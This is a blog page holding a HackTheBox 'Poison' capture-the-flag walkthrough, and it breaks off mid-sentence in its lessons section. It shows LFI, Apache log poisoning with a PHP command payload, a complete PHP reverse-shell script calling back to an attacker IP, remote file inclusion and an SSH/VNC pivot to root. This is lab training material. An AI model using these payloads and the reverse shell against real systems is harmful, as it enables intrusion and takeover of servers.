<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>realspaceeagle</title><meta name=keywords content><meta name=description content="ÃƒÂ¯Ã‚Â»Ã‚Â¿+++
date = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
lastmod = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
draft = false
title = &ldquo;HackTheBox: Poison Walkthrough&rdquo;
description = &ldquo;Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.&rdquo;
summary = &ldquo;Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.&rdquo;
keywords = [&ldquo;hackthebox poison&rdquo;,&ldquo;lfi&rdquo;,&ldquo;log poisoning&rdquo;,&ldquo;reverse shell&rdquo;,&ldquo;base64 decode&rdquo;,&ldquo;vnc pivot&rdquo;,&ldquo;freebsd&rdquo;,&ldquo;htb&rdquo;]
tags = [&ldquo;hackthebox&rdquo;,&ldquo;web-exploitation&rdquo;,&ldquo;lfi&rdquo;,&ldquo;reverse-shell&rdquo;,&ldquo;privilege-escalation&rdquo;]
categories = [&ldquo;HackTheBox&rdquo;]
author = &ldquo;realspaceeagle&rdquo;
image = &ldquo;/images/poison-htb/poison-browse-interface.png&rdquo;
+++"><meta name=author content="realspaceeagle"><link rel=canonical href=https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/><link crossorigin=anonymous href=/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as=style><link rel=icon href=https://realspaceeagle.github.io/favicon.svg><link rel=icon type=image/png sizes=16x16 href=https://realspaceeagle.github.io/favicon.svg><link rel=icon type=image/png sizes=32x32 href=https://realspaceeagle.github.io/favicon.svg><link rel=apple-touch-icon href=https://realspaceeagle.github.io/favicon.svg><link rel=mask-icon href=https://realspaceeagle.github.io/favicon.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta name=description content="ÃƒÂ¯Ã‚Â»Ã‚Â¿+++
date = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
lastmod = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
draft = false
title = &ldquo;HackTheBox: Poison …"><meta name=keywords content="cybersecurity,penetration testing,ethical hacking,network security,vulnerability assessment,security tutorials,infosec,cyber defense,hackthebox,oscp,malware analysis"><meta name=author content="realspaceeagle"><meta name=robots content="index, follow"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=canonical href=https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/><meta property="og:title" content=" - realspaceeagle"><meta property="og:description" content="ÃƒÂ¯Ã‚Â»Ã‚Â¿+++
date = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
lastmod = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
draft = false
title = &ldquo;HackTheBox: Poison Walkthrough&rdquo;
description = &ldquo;Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI …"><meta property="og:url" content="https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/"><meta property="og:site_name" content="realspaceeagle"><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:author" content="realspaceeagle"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg"><meta property="og:image:alt" content="realspaceeagle"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@haran_loga"><meta name=twitter:creator content="@haran_loga"><meta name=twitter:title content=" - realspaceeagle"><meta name=twitter:description content="ÃƒÂ¯Ã‚Â»Ã‚Â¿+++
date = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
lastmod = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
draft = false
title = &ldquo;HackTheBox: Poison Walkthrough&rdquo;
description = …"><meta name=twitter:image content="https://realspaceeagle.github.io/images/og-image.svg"><meta name=twitter:image:alt content="realspaceeagle"><meta name=article:author content="realspaceeagle"><meta name=article:publisher content="https://realspaceeagle.github.io/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"","description":"\u003cp\u003eÃƒÂ¯Ã‚Â»Ã‚Â¿\u002b\u002b\u002b\ndate = \u0026ldquo;2025-10-01T00:00:00\u002b00:00\u0026rdquo;\nlastmod = \u0026ldquo;2025-10-01T00:00:00\u002b00:00\u0026rdquo;\ndraft = false\ntitle = \u0026ldquo;HackTheBox: Poison Walkthrough\u0026rdquo;\ndescription = \u0026ldquo;Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.\u0026rdquo;\nsummary = \u0026ldquo;Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH\/VNC pivot to root.\u0026rdquo;\nkeywords = [\u0026ldquo;hackthebox poison\u0026rdquo;,\u0026ldquo;lfi\u0026rdquo;,\u0026ldquo;log poisoning\u0026rdquo;,\u0026ldquo;reverse shell\u0026rdquo;,\u0026ldquo;base64 decode\u0026rdquo;,\u0026ldquo;vnc pivot\u0026rdquo;,\u0026ldquo;freebsd\u0026rdquo;,\u0026ldquo;htb\u0026rdquo;]\ntags = [\u0026ldquo;hackthebox\u0026rdquo;,\u0026ldquo;web-exploitation\u0026rdquo;,\u0026ldquo;lfi\u0026rdquo;,\u0026ldquo;reverse-shell\u0026rdquo;,\u0026ldquo;privilege-escalation\u0026rdquo;]\ncategories = [\u0026ldquo;HackTheBox\u0026rdquo;]\nauthor = \u0026ldquo;realspaceeagle\u0026rdquo;\nimage = \u0026ldquo;\/images\/poison-htb\/poison-browse-interface.png\u0026rdquo;\n\u002b\u002b\u002b\u003c\/p\u003e","author":{"@type":"Person","name":"realspaceeagle","jobTitle":"Cybersecurity Professional \u0026 Penetration Tester","description":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","url":"https:\/\/realspaceeagle.github.io\/"},"publisher":{"@type":"Person","name":"realspaceeagle","jobTitle":"Cybersecurity Professional \u0026 Penetration Tester","url":"https:\/\/realspaceeagle.github.io\/"},"datePublished":"0001-01-01T00:00:00Z","url":"https:\/\/realspaceeagle.github.io\/posts\/hackthebox-poison-walkthrough\/","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/realspaceeagle.github.io\/posts\/hackthebox-poison-walkthrough\/"},"image":{"@type":"ImageObject","url":"https:\/\/realspaceeagle.github.io\/images\/og-image.svg","width":1200,"height":630},"keywords":"cybersecurity, penetration testing, ethical hacking, network security, vulnerability assessment, security tutorials, infosec, cyber defense, hackthebox, oscp, malware analysis","articleSection":"","wordCount":2416,"genre":["Cybersecurity","Technology","Education"],"about":[]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/realspaceeagle.github.io\/"},{"@type":"ListItem","position":2,"name":"","item":"https:\/\/realspaceeagle.github.io\/posts\/hackthebox-poison-walkthrough\/"}]}</script><link rel=stylesheet href=/css/terminal-style.css><link rel=stylesheet href=/css/scroll-enhancement.css><link rel=stylesheet href=/css/mobile-navigation.css><link rel=stylesheet href=/css/share-buttons.css><link rel=stylesheet href=/css/comments.css><link rel=stylesheet href=/css/blog-enhancements.css><link rel=stylesheet href=/css/blog-sidebar.css><link rel=stylesheet href=/css/project-toggle.css><link rel=stylesheet href=/css/code-copy-enhancements.css><link rel=stylesheet href=/css/ctf-writeup.css><link rel=stylesheet href=/css/github-stats.css><link rel=stylesheet href=https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css onerror=this.remove()><script src=https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js onerror=this.remove()></script><script src=/js/github-contribution-tracker.js defer></script><script src=/js/github-api-fallback.js defer></script><script src=/js/github-integration.js defer></script><script src=/js/twitter-timeline.js defer></script><script src=/js/twitter-manual.js defer></script><script src=/js/code-copy-enhanced.js defer></script><script src=/js/enhanced-search.js defer></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GPTRZ14YZS")}</script><meta property="og:url" content="https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/"><meta property="og:site_name" content="realspaceeagle"><meta property="og:title" content="realspaceeagle"><meta property="og:description" content="ÃƒÂ¯Ã‚Â»Ã‚Â¿+++ date = “2025-10-01T00:00:00+00:00” lastmod = “2025-10-01T00:00:00+00:00” draft = false title = “HackTheBox: Poison Walkthrough” description = “Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.” summary = “Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.” keywords = [“hackthebox poison”,“lfi”,“log poisoning”,“reverse shell”,“base64 decode”,“vnc pivot”,“freebsd”,“htb”] tags = [“hackthebox”,“web-exploitation”,“lfi”,“reverse-shell”,“privilege-escalation”] categories = [“HackTheBox”] author = “realspaceeagle” image = “/images/poison-htb/poison-browse-interface.png” +++"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://realspaceeagle.github.io/images/og-image.svg"><meta name=twitter:title content><meta name=twitter:description content="ÃƒÂ¯Ã‚Â»Ã‚Â¿+++
date = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
lastmod = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
draft = false
title = &ldquo;HackTheBox: Poison Walkthrough&rdquo;
description = &ldquo;Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.&rdquo;
summary = &ldquo;Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.&rdquo;
keywords = [&ldquo;hackthebox poison&rdquo;,&ldquo;lfi&rdquo;,&ldquo;log poisoning&rdquo;,&ldquo;reverse shell&rdquo;,&ldquo;base64 decode&rdquo;,&ldquo;vnc pivot&rdquo;,&ldquo;freebsd&rdquo;,&ldquo;htb&rdquo;]
tags = [&ldquo;hackthebox&rdquo;,&ldquo;web-exploitation&rdquo;,&ldquo;lfi&rdquo;,&ldquo;reverse-shell&rdquo;,&ldquo;privilege-escalation&rdquo;]
categories = [&ldquo;HackTheBox&rdquo;]
author = &ldquo;realspaceeagle&rdquo;
image = &ldquo;/images/poison-htb/poison-browse-interface.png&rdquo;
+++"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://realspaceeagle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"","item":"https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"","name":"","description":"ÃƒÂ¯Ã‚Â»Ã‚Â¿+++ date = \u0026ldquo;2025-10-01T00:00:00+00:00\u0026rdquo; lastmod = \u0026ldquo;2025-10-01T00:00:00+00:00\u0026rdquo; draft = false title = \u0026ldquo;HackTheBox: Poison Walkthrough\u0026rdquo; description = \u0026ldquo;Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.\u0026rdquo; summary = \u0026ldquo;Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.\u0026rdquo; keywords = [\u0026ldquo;hackthebox poison\u0026rdquo;,\u0026ldquo;lfi\u0026rdquo;,\u0026ldquo;log poisoning\u0026rdquo;,\u0026ldquo;reverse shell\u0026rdquo;,\u0026ldquo;base64 decode\u0026rdquo;,\u0026ldquo;vnc pivot\u0026rdquo;,\u0026ldquo;freebsd\u0026rdquo;,\u0026ldquo;htb\u0026rdquo;] tags = [\u0026ldquo;hackthebox\u0026rdquo;,\u0026ldquo;web-exploitation\u0026rdquo;,\u0026ldquo;lfi\u0026rdquo;,\u0026ldquo;reverse-shell\u0026rdquo;,\u0026ldquo;privilege-escalation\u0026rdquo;] categories = [\u0026ldquo;HackTheBox\u0026rdquo;] author = \u0026ldquo;realspaceeagle\u0026rdquo; image = \u0026ldquo;/images/poison-htb/poison-browse-interface.png\u0026rdquo; +++\n","keywords":[],"articleBody":"ÃƒÂ¯Ã‚Â»Ã‚Â¿+++ date = “2025-10-01T00:00:00+00:00” lastmod = “2025-10-01T00:00:00+00:00” draft = false title = “HackTheBox: Poison Walkthrough” description = “Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.” summary = “Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.” keywords = [“hackthebox poison”,“lfi”,“log poisoning”,“reverse shell”,“base64 decode”,“vnc pivot”,“freebsd”,“htb”] tags = [“hackthebox”,“web-exploitation”,“lfi”,“reverse-shell”,“privilege-escalation”] categories = [“HackTheBox”] author = “realspaceeagle” image = “/images/poison-htb/poison-browse-interface.png” +++\nPoison is a FreeBSD machine that starts with a web application vulnerable to Local File Inclusion (LFI), which leads to log poisoning and remote code execution. After gaining initial access, I’ll find heavily encoded credentials that provide SSH access to the machine. From there, the path to root involves VNC running on localhost that can be accessed through SSH tunneling.\nReconnaissance nmap I’ll start my enumeration with nmap and run my standard TCP scan:\n$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.84 Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:00 EDT Nmap scan report for 10.10.10.84 Host is up (0.065s latency). Not shown: 65530 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 119/tcp open nntp Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds Based on these results, I’ll run a deeper nmap scan on the open ports:\n$ nmap -p 22,25,80,110,119 -sCV -oA scans/nmap-tcpscripts 10.10.10.84 Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:01 EDT Nmap scan report for 10.10.10.84 Host is up (0.065s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | 256 4c:e8:c6:02:bd:fc:83:e6:36:00:06:05:65:38:7c:78 (ECDSA) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) 25/tcp open smtp Sendmail 8.15.2/8.15.2 | smtp-commands: Poison.htb, EHLO, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, DELIVERBY, |_List of commands 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 |_http-title: Site doesn't have a title (text/html). 110/tcp open pop3 Qpopper 4.0.9 119/tcp open nntp INN 2.6.3 Service Info: Host: Poison.htb; OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds The target is running FreeBSD with several services including SSH, SMTP, HTTP, POP3, and NNTP. The most interesting service for initial exploitation is the Apache HTTP server on port 80 running PHP 5.6.32.\nWebsite - TCP 80 Site The website presents a simple interface without much content:\nThe page shows what appears to be a file browser interface. Looking at the HTML source doesn’t reveal anything interesting initially.\nDirectory Brute Force I’ll run gobuster to find additional paths:\n$ gobuster dir -u http://10.10.10.84 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.84 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/09/15 10:15:30 Starting gobuster =============================================================== /browse.php (Status: 200) [Size: 289] /index.php (Status: 200) [Size: 289] /info.php (Status: 200) [Size: 68315] /ini.php (Status: 200) [Size: 75] /phpinfo.php (Status: 200) [Size: 68315] =============================================================== 2023/09/15 10:17:22 Finished =============================================================== The browse.php file is particularly interesting. Visiting it shows a file browser interface that accepts a file parameter. Testing with different values reveals it’s vulnerable to Local File Inclusion (LFI).\nLocal File Inclusion Testing LFI The browse.php page accepts a file parameter, making it a prime candidate for LFI testing:\n$ curl http://10.10.10.84/browse.php?file=/etc/passwd This returns the contents of /etc/passwd, confirming the LFI vulnerability.\nReading PHP Source I can use PHP filter wrappers to read the source code of PHP files:\n$ curl \"http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=browse.php\" This returns a base64-encoded version of the PHP source. Decoding it reveals:\n\u003c?php $file = $_GET['file']; if(isset($file)) { include(\"$file\"); } else { include(\"index.php\"); } ?\u003e The code directly includes whatever file is specified in the file parameter without any filtering, making it highly vulnerable.\nLog Poisoning Since I can include any file, I’ll attempt log poisoning by injecting PHP code into the Apache access logs. First, I’ll make a request with PHP code in the User-Agent header:\n$ curl \"http://10.10.10.84/\" -H \"User-Agent: \u003c?php system(\\$_GET['cmd']); ?\u003e\" Now I can include the access log file and execute commands:\n$ curl \"http://10.10.10.84/browse.php?file=/var/log/httpd-access.log\u0026cmd=id\" This successfully executes the id command, showing:\nShell via RFI Creating Reverse Shell Since command execution through log poisoning can be unstable, I’ll use Remote File Inclusion (RFI) to get a more reliable shell. First, I’ll create a PHP reverse shell:\n\u003c?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.14.13'; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), 1 =\u003e array(\"pipe\", \"w\"), 2 =\u003e array(\"pipe\", \"w\") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e Serving the Shell I’ll serve the shell file using Python’s built-in HTTP server:\n$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Setting up Listener In another terminal, I’ll set up a netcat listener:\n$ nc -nlvp 9001 listening on [any] 9001 ... Triggering the RFI Now I’ll trigger the RFI by including my hosted PHP file:\n$ curl \"http://10.10.10.84/browse.php?file=http://10.10.14.13:8000/shell.php\" This gives me a shell as the www user:\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.10.84] 64838 FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64 2:15PM up 2 mins, 0 users, load averages: 0.09, 0.16, 0.08 uid=80(www) gid=80(www) groups=80(www) /usr/local/www/apache24/data $ python -c 'import pty;pty.spawn(\"/bin/sh\")' Enumeration as www Finding User Credentials Now that I have a shell, I’ll enumerate the system. Looking in the /home directory:\n$ ls /home charix $ ls -la /home/charix total 41 drwxr-xr-x 2 charix charix 512 Mar 19 2018 . drwxr-xr-x 3 root wheel 512 Mar 19 2018 .. -rw-r--r-- 1 charix charix 87 Mar 19 2018 .history -rw-r--r-- 1 charix charix 771 Mar 19 2018 .shrc -rw-r----- 1 charix charix 33 Mar 19 2018 user.txt -rw-r--r-- 1 root root 166 Mar 19 2018 secret.zip I can’t read user.txt yet, but there’s a secret.zip file. Let me also check the web directory:\n$ ls -la /usr/local/www/apache24/data total 36 drwxr-xr-x 2 www www 512 Mar 19 2018 . drwxr-xr-x 3 www www 512 Jan 24 2018 .. -rw-r--r-- 1 www www 289 Mar 19 2018 browse.php -rw-r--r-- 1 www www 289 Mar 19 2018 index.php -rw-r--r-- 1 www www 68 Mar 19 2018 info.php -rw-r--r-- 1 www www 289 Mar 19 2018 ini.php -rw-r--r-- 1 www www 78 Mar 19 2018 listfiles.php -rw-r--r-- 1 www www 935 Mar 19 2018 phpinfo.php -rw-r--r-- 1 www www 68 Mar 19 2018 pwdbackup.txt There’s a pwdbackup.txt file! Let me examine it:\n$ cat pwdbackup.txt This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1VWWnRjRWRUTWxKSVZsaG9XMkV4Y0hKWFZscHJWakpHYzFOc1dtRlRSbVJWVFZkU1QxWnRSblZVYmxKaFVubEtSMFpHV25SVlJFcG9aV3hhVmxkc1VsUlphbXhhVTJ0a1IxSXhWalZhUkZaS1drWmFVbGt4Vm1wU2JFRjRVVVF3UVE9PQ== This looks like Base64 encoded data that’s been encoded multiple times. Let me decode it:\n$ data=$(cat pwdbackup.txt | tail -1); for i in $(seq 1 13); do data=$(echo $data | base64 -d); done; echo $data Charix!2#4%6\u00268(0 Perfect! Now I have the password for the charix user: Charix!2#4%6\u00268(0\nSSH as charix I can now SSH into the system as charix:\n$ ssh charix@10.10.10.84 Password for charix@Poison: Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017 Welcome to FreeBSD! charix@Poison:~ % cat user.txt eaacdf[...]7aa428 Now I can read the user flag. I also notice the secret.zip file in the home directory:\ncharix@Poison:~ % ls -la total 41 drwxr-xr-x 2 charix charix 512 Mar 19 2018 . drwxr-xr-x 3 root wheel 512 Mar 19 2018 .. -rw-r--r-- 1 charix charix 87 Mar 19 2018 .history -rw-r--r-- 1 charix charix 771 Mar 19 2018 .shrc -rw-r----- 1 charix charix 33 Mar 19 2018 user.txt -rw-r--r-- 1 root root 166 Mar 19 2018 secret.zip charix@Poison:~ % unzip secret.zip Archive: secret.zip [secret.zip] secret password: The zip file is password protected. Let me try the same password I just found:\ncharix@Poison:~ % unzip secret.zip Archive: secret.zip [secret.zip] secret password: extracting: secret charix@Poison:~ % file secret secret: Non-ISO extended-ASCII text charix@Poison:~ % xxd secret 00000000: bdcb 7a4b 27f0 6a65 d827 2b44 7ae7 7b6d ..zK'.je.'+D~.{m This appears to be some kind of binary file. Let me keep this for later use.\nPrivilege Escalation Discovering VNC Let me check what processes are running on the system:\ncharix@Poison:~ % ps aux | grep -v \"[\" USER PID %CPU %MEM VSZ RSS TT STAT STARTED TIME COMMAND root 11 0.0 0.0 0 0 - RL 22:36 0:00.08 idle root 529 0.0 0.1 10484 2044 - Is 22:36 0:00.01 /usr/sbin/syslogd -s root 620 0.0 0.2 56320 4032 - I 22:36 0:00.02 /usr/local/bin/python /usr/local/bin/supervisord -c /usr/local/etc/supervisord.conf root 819 0.0 0.6 67220 12588 - I 22:36 0:00.04 /usr/local/bin/Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1 root 851 0.0 0.1 9584 2392 - Is 22:36 0:00.01 /usr/sbin/cron -s charix 2303 0.0 0.2 19660 3352 0 I+ 22:52 0:00.01 /usr/bin/su - Interesting! There’s a VNC server (Xvnc) running as root on port 5901, but it’s bound to localhost only (-localhost flag). The process also uses -rfbauth /root/.vnc/passwd for authentication.\nLet me also check what ports are listening:\ncharix@Poison:~ % netstat -an | grep LISTEN tcp4 0 0 127.0.0.1.25 *.* LISTEN tcp4 0 0 *.80 *.* LISTEN tcp6 0 0 *.80 *.* LISTEN tcp4 0 0 *.22 *.* LISTEN tcp6 0 0 *.22 *.* LISTEN tcp4 0 0 127.0.0.1.5801 *.* LISTEN tcp4 0 0 127.0.0.1.5901 *.* LISTEN tcp4 0 0 *.110 *.* LISTEN tcp6 0 0 *.110 *.* LISTEN tcp4 0 0 *.119 *.* LISTEN tcp6 0 0 *.119 *.* LISTEN Perfect! VNC is listening on ports 5801 (HTTP) and 5901 (VNC) on localhost. The secret file I found earlier is likely the VNC password file.\nSetting up SSH Tunnel Since VNC is only accessible from localhost, I’ll create an SSH tunnel to access it from my attacking machine:\n$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84 This forwards my local port 5901 to the target’s localhost:5901.\nConnecting to VNC Now I can connect to VNC using the secret file as the password:\n$ vncviewer 127.0.0.1:5901 -passwd secret The VNC connection is successful! I can see the desktop environment running as root.\nFrom the VNC desktop, I can open a terminal and access the root flag:\nroot@Poison:~ # cat /root/root.txt 716d[...]92ba The secret file contained the VNC password in the proper encrypted format that VNC expects. With VNC access as root, I have complete control over the system.\nThis walkthrough demonstrated: Reconnaissance: Nmap scanning revealed SSH, SMTP, HTTP, POP3, and NNTP services running on FreeBSD. Web Enumeration: Directory brute-forcing discovered vulnerable browse.php file browser. LFI Exploitation: PHP filter wrappers exposed source code and enabled log poisoning attacks. Log Poisoning: Injecting PHP code into Apache access logs for remote code execution. RFI Exploitation: Remote file inclusion provided more stable shell access than log poisoning. Credential Discovery: Multiple base64 encoded password found in web directory backup file. Privilege Escalation: Process enumeration revealed VNC server running as root on localhost. SSH Tunneling: Port forwarding enabled access to localhost-bound VNC service. VNC Access: Encrypted password file provided root desktop access for flag capture. Key Lessons: Web Application Security Never store credentials in web-accessible directories: The pwdbackup.txt file should never have been in the web root - even with obfuscation Input validation is critical: The browse.php file parameter lacked proper sanitization and filtering LFI vulnerabilities are extremely dangerous: Direct file inclusion without filtering leads to immediate system compromise Directory traversal attacks are still prevalent: ../ sequences bypassed basic filtering attempts Log Poisoning \u0026 RFI Techniques Log poisoning is a reliable LFI escalation technique: Web server logs provide a writable target for PHP injection User-Agent headers are prime targets: HTTP headers often logged without sanitization RFI provides more stable access: Remote file inclusion offered better shell stability than log poisoning PHP filter wrappers expose source code: php://filter/convert.base64-encode reveals application logic Privilege Escalation Insights Process enumeration reveals attack surfaces: Services bound to localhost can be accessed through SSH tunneling Service isolation matters: VNC running as root violates the principle of least privilege Network service binding is security-relevant: Localhost-only binding prevented direct access but SSH tunneling bypassed this Encrypted files aren’t always secure: The VNC password file used weak encryption easily bypassed Password \u0026 Authentication Weaknesses Multiple encoding layers don’t provide security: Obfuscation through repeated base64 encoding is easily defeated Password reuse is dangerous: The same password worked for multiple services and files Weak VNC authentication: Simple password-based VNC access provided full root desktop control Credential discovery through enumeration: Systematic 